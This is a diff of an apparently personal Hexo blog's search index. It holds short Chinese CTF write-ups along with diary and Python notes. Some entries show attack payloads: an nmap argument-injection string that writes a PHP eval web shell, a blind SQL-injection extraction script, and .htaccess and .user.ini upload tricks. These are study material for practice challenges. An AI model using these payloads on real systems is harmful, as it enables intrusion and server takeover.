-  <entry>
-    <title>20210907</title>
-    <url>/posts/6330ace9/</url>
-    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
-<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
-<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
-</code></pre>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
-        <tag>命令执行</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -915,49 +958,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210926</title>
-    <url>/posts/2601fefd/</url>
-    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
-<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
-<p>这个题呢，最终就是直接跑脚本</p>
-<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
-<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
-<p>sql的三目运算</p>
-<pre><code>if( 表达式1，表达式2，表达式3)
-</code></pre>
-<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
-<p>或者异或注入</p>
-<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
-</code></pre>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
-<blockquote>
-<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
-</blockquote>
-<p>进行尝试，</p>
-<p>首先id=1union：</p>
-<p>SQL Injection Checked.</p>
-<p>再试试id=union1union：</p>
-<p>bool(false)</p>
-<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
-<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
-
-<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
-<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>测试工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20211015</title>
     <url>/posts/2348a06e/</url>
     <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
@@ -982,6 +982,34 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20211018</title>
+    <url>/posts/5df9dcd3/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211031</title>
+    <url>/posts/161306f5/</url>
+    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
+<p>刚开始玩了会古墓丽影，不想玩了</p>
+<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
+<p>现在博客Github上和服务器上的都能用</p>
+<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
+<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
+<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
+<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>20211017</title>
     <url>/posts/cd46c142/</url>
     <content><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p>
@@ -1002,51 +1030,6 @@ Submit
         <tag>web</tag>
         <tag>文件上传</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>20211018</title>
-    <url>/posts/5df9dcd3/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20211118</title>
-    <url>/posts/5c3bb6e4/</url>
-    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
-<p>上传shell.jpeg</p>
-<p>直接扫目录即可，没有过滤，非常友善</p>
-<pre><code>var_dump(file_get_contents(&#39;/flag&#39;));
-</code></pre>
-<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p>
-<pre><code>auto_prepend_file=shell.jpeg
-</code></pre>
-<p>以前都是</p>
-<pre><code>auto_append_file=1.txt
-</code></pre>
-<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>20211031</title>
-    <url>/posts/161306f5/</url>
-    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
-<p>刚开始玩了会古墓丽影，不想玩了</p>
-<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
-<p>现在博客Github上和服务器上的都能用</p>
-<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
-<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
-<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
-<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
   </entry>
   <entry>
     <title>20211117</title>
@@ -1078,6 +1061,23 @@ var_dump(file_get_contents(&quot;/flag&quot;));
         <tag>ctf</tag>
         <tag>web</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>20211118</title>
+    <url>/posts/5c3bb6e4/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
+<p>上传shell.jpeg</p>
+<p>直接扫目录即可，没有过滤，非常友善</p>
+<pre><code>var_dump(file_get_contents(&#39;/flag&#39;));
+</code></pre>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p>
+<pre><code>auto_prepend_file=shell.jpeg
+</code></pre>
+<p>以前都是</p>
+<pre><code>auto_append_file=1.txt
+</code></pre>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
+]]></content>
   </entry>
   <entry>
     <title>20211129</title>
@@ -1184,6 +1184,11 @@ is=flag&amp;flag=flag
       </tags>
   </entry>
   <entry>
+    <title>20220101</title>
+    <url>/posts/c3e022b4/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>CUMTCTF春季赛部分writeup</title>
     <url>/posts/17e673fc/</url>
     <content><![CDATA[<blockquote>
@@ -1283,29 +1288,6 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
-    <title>20220101</title>
-    <url>/posts/c3e022b4/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>V&amp;NCTF2021</title>
-    <url>/posts/6dd4bc92/</url>
-    <content><![CDATA[<blockquote>
-<p>部分wp</p>
-</blockquote>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
-<p>原理如下，并不是很复杂：</p>
-<p>首先将图片看作信号,</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CUMT初夏赛部分wp</title>
     <url>/posts/b061f28/</url>
     <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
@@ -1373,6 +1355,24 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>V&amp;NCTF2021</title>
+    <url>/posts/6dd4bc92/</url>
+    <content><![CDATA[<blockquote>
+<p>部分wp</p>
+</blockquote>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
+<p>原理如下，并不是很复杂：</p>
+<p>首先将图片看作信号,</p>
+<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VSCode简单配置C艹环境</title>
     <url>/posts/c150e260/</url>
     <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
@@ -1421,6 +1421,7 @@ print(&#39;&#39;.join(flag))
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取所有用户列表：GET &#x2F;users</span><br><span class="line">获取用户a的详情：GET &#x2F;users&#x2F;a</span><br><span class="line">新增用户：POST &#x2F;users</span><br><span class="line">修改用户a的信息：PUT &#x2F;users&#x2F;a</span><br><span class="line">删除用户a：DELETE &#x2F;users&#x2F;a</span><br></pre></td></tr></table></figure>
 
 <p><strong>我感觉是另一种方式的所见即所得，喜闻乐见</strong></p>
+<span id="more"></span>
 <h2 id="一个flask的小型项目，涉及mysql"><a href="#一个flask的小型项目，涉及mysql" class="headerlink" title="一个flask的小型项目，涉及mysql"></a>一个flask的小型项目，涉及mysql</h2><blockquote>
 <p>自我感觉写的跟屎一样</p>
 </blockquote>
@@ -1623,6 +1624,18 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>jwt总结</title>
+    <url>/posts/e8e4811b/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git更新</title>
     <url>/posts/bc46b23a/</url>
     <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
@@ -1635,18 +1648,6 @@ print(&#39;&#39;.join(flag))
       </categories>
       <tags>
         <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jwt总结</title>
-    <url>/posts/e8e4811b/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1712,27 +1713,6 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
-    <title>python实现校园网自动登录</title>
-    <url>/posts/cfeeb04a/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>实现了CUMT_Tec和CUMT_Stu的连接，这个我也挺奇怪，tec竟然也能连</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121707.png"></p>
-<p>而且竟然能用</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121757.png"></p>
-<p>用pyinstaller打包成exe后，设置开机自启动，开机就能自动连了，非常舒服!</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121942.png"></p>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">TIME = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;Portal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">f&#x27;dr<span class="subst">&#123;TIME&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login_method&#x27;</span>: <span class="number">1</span>, <span class="comment"># 运营商编号，我这个是联通</span></span><br><span class="line">    <span class="string">&#x27;user_account&#x27;</span>: <span class="string">&#x27;xxxxxxxx@unicom&#x27;</span>, <span class="comment"># xxxx处为学号</span></span><br><span class="line">    <span class="string">&#x27;user_password&#x27;</span>: <span class="string">&#x27;xxxxxxxx&#x27;</span>, <span class="comment"># xxxxx处为密码</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_ip&#x27;</span>: <span class="string">&#x27;xxxxxx&#x27;</span>, <span class="comment"># ipconfig自己获取</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_mac&#x27;</span>: <span class="string">&#x27;00000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_ip&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_name&#x27;</span>: <span class="string">&#x27;NAS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jsVersion&#x27;</span>: <span class="string">&#x27;3.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>: TIME</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q:0.8,zh-TW;q:0.7,zh-HK;q:0.5,en-US;q:0.3,en;q:0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://10.2.5.251/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.2.5.251:801/eportal/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, headers=headers, params=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后打包，设置开机自启动就行</p>
-]]></content>
-      <categories>
-        <category>python实践</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python学习笔记</title>
     <url>/posts/743c31e9/</url>
     <content><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><ul>
@@ -1774,18 +1754,21 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
-    <title>python爬虫深入</title>
-    <url>/posts/3d5e7979/</url>
-    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
+    <title>python实现校园网自动登录</title>
+    <url>/posts/cfeeb04a/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>实现了CUMT_Tec和CUMT_Stu的连接，这个我也挺奇怪，tec竟然也能连</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121707.png"></p>
+<p>而且竟然能用</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121757.png"></p>
+<p>用pyinstaller打包成exe后，设置开机自启动，开机就能自动连了，非常舒服!</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121942.png"></p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">TIME = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;Portal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">f&#x27;dr<span class="subst">&#123;TIME&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login_method&#x27;</span>: <span class="number">1</span>, <span class="comment"># 运营商编号，我这个是联通</span></span><br><span class="line">    <span class="string">&#x27;user_account&#x27;</span>: <span class="string">&#x27;xxxxxxxx@unicom&#x27;</span>, <span class="comment"># xxxx处为学号</span></span><br><span class="line">    <span class="string">&#x27;user_password&#x27;</span>: <span class="string">&#x27;xxxxxxxx&#x27;</span>, <span class="comment"># xxxxx处为密码</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_ip&#x27;</span>: <span class="string">&#x27;xxxxxx&#x27;</span>, <span class="comment"># ipconfig自己获取</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_mac&#x27;</span>: <span class="string">&#x27;00000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_ip&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_name&#x27;</span>: <span class="string">&#x27;NAS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jsVersion&#x27;</span>: <span class="string">&#x27;3.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>: TIME</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q:0.8,zh-TW;q:0.7,zh-HK;q:0.5,en-US;q:0.3,en;q:0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://10.2.5.251/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.2.5.251:801/eportal/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, headers=headers, params=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
-<p>xpath语法</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
-
+<p>然后打包，设置开机自启动就行</p>
 ]]></content>
       <categories>
-        <category>python学习</category>
+        <category>python实践</category>
       </categories>
       <tags>
         <tag>python</tag>
@@ -1850,6 +1833,24 @@ str + &#39; &#39; # 连接字符串
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python爬虫深入</title>
+    <url>/posts/3d5e7979/</url>
+    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
+
+<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
+<p>xpath语法</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>python学习</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -2060,7 +2061,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
